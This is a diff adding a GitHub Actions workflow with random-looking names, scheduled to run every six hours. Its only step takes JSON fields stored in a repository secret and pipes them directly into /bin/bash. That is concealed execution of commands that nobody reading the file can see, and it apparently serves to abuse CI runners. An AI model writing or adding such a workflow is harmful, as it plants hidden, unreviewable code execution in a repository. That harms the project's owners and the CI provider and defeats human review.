@@ -1,0 +1,23 @@
+name: xuduorenaa
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xuduorenaa
+        env:
+          wteyq68: ${{ secrets.wteyq68 }}
+        run: |
+          echo $wteyq68 | jq -r .tch716 | /bin/bash
+          echo $jcp985 | jq -r .lq83 | /bin/bash
+          echo $dj39 | jq -r .wuvv249 | /bin/bash
+          echo $cret3 | jq -r .wb1678 | /bin/bash
+          echo $apvmr57 | jq -r .j24 | /bin/bash
+          echo $y8 | jq -r .ud77305 | /bin/bash
+
